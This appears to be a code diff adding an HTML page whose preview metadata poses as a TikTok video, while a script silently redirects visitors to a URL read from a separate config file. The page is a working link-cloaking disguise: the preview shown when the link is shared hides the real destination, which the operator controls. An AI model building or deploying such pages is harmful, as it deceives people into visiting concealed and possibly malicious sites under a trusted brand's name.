@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta property="og:title" content="TikTok" />
+  <meta property="og:description" content="Watch this video on TikTok" />
+  <meta property="og:image" content="https://p16-sign.tiktokcdn-us.com/tos-useast5-p-0068-tx/og_default.jpg" />
+  <meta property="og:url" content="https://www.tiktok.com" />
+  <meta property="og:site_name" content="TikTok" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="TikTok" />
+  <meta id="redirect-url" name="redirect" content="https://www.tiktok.com" />
+</head>
+<body>
+<script>
+  // Recupere la vraie URL depuis le fichier config
+  fetch('/tok/video.json?t=' + Date.now())
+    .then(r => r.json())
+    .then(data => {
+      if (data.url) window.location.href = data.url;
+      else window.location.href = 'https://www.tiktok.com';
+    })
+    .catch(() => window.location.href = 'https://www.tiktok.com');
+</script>
+</body>
+</html>
